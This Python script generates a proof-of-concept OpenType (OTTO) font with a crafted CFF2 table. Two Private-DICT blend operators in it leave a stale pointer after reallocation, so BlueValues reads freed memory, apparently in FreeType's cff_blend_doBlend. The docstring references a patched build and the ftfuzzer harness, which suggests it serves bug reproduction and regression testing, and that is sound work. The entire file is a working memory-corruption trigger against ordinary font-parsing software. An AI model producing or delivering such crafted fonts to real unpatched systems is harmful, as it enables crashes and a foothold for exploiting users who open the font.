#!/usr/bin/env python3
"""CFF2 font that runs two Private-DICT blend operators.

cff_blend_doBlend stores parser-stack pointers into blend_stack. The second
blend reallocates that buffer and leaves the first pointer stale.
BlueValues then reads it. The patched build rewrites those pointers after
realloc. Wrapped in a minimal OTTO font so ftfuzzer opens face 0 and parses
the Private DICT (a bare CFF2 has num_faces 0 and is never fully loaded).
"""
import argparse
import pathlib
import struct


def u16(n: int) -> bytes:
    return n.to_bytes(2, "big")


def u32(n: int) -> bytes:
    return n.to_bytes(4, "big")


def num5(n: int) -> bytes:
    return bytes([29]) + u32(n & 0xFFFFFFFF)


def small(n: int) -> bytes:
    return bytes([n + 139])


def cff2() -> bytes:
    priv = small(1) + small(1) + bytes([23])
    priv += small(1) * 20 + small(20) + bytes([23]) + bytes([6])
    cs = u32(1) + bytes([1, 1, 2, 0x0E])
    gsubr = b"\x00\x00\x00\x00"
    vstore_body = (
        u16(1) + u32(12) + u16(1) + u32(16) + u16(0) + u16(0) + b"\x00" * 4 + u16(0)
    )
    vstore = u16(len(vstore_body)) + vstore_body
    cs_off = 28
    vs_off = cs_off + len(cs)
    fd_off = vs_off + len(vstore)
    priv_off = fd_off + 14
    fd_data = small(len(priv)) + num5(priv_off) + bytes([18])
    fd = u32(1) + bytes([1, 1, 1 + len(fd_data)]) + fd_data
    top = (
        num5(cs_off)
        + bytes([17])
        + num5(fd_off)
        + bytes([12, 0x24])
        + num5(vs_off)
        + bytes([24])
    )
    return bytes([2, 0, 5]) + u16(len(top)) + top + gsubr + cs + vstore + fd + priv


def head() -> bytes:
    return struct.pack(
        ">IIIIHHQQhhhhHHhhh",
        0x00010000,
        0x00010000,
        0,
        0x5F0F3CF5,
        0,
        1000,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        8,
        2,
        0,
        0,
    )


def hhea() -> bytes:
    return struct.pack(
        ">IhhhHhhhhhhhhhhhH",
        0x00010000,
        800,
        -200,
        0,
        500,
        0,
        0,
        0,
        1,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
    )


def wrap_otto(cff: bytes) -> bytes:
    tables = [
        (b"CFF2", cff),
        (b"head", head()),
        (b"hhea", hhea()),
        (b"hmtx", struct.pack(">Hh", 500, 0)),
        (b"maxp", struct.pack(">IH", 0x00005000, 1)),
    ]
    tables.sort(key=lambda item: item[0])
    n = len(tables)
    search = 1
    entry = 0
    while search * 2 <= n:
        search *= 2
        entry += 1
    off = 12 + n * 16
    records = []
    blob = b""
    for tag, data in tables:
        pad = (4 - (off % 4)) % 4
        blob += b"\x00" * pad
        off += pad
        records.append((tag, off, len(data)))
        blob += data
        off += len(data)
    font = struct.pack(">IHHHH", 0x4F54544F, n, search * 16, entry, n * 16 - search * 16)
    for tag, toff, tlen in records:
        font += tag + u32(0) + u32(toff) + u32(tlen)
    return font + blob


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc.bin")
    args = ap.parse_args()
    out = pathlib.Path(args.out)
    out.write_bytes(wrap_otto(cff2()))
    print(f"wrote {out} ({out.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
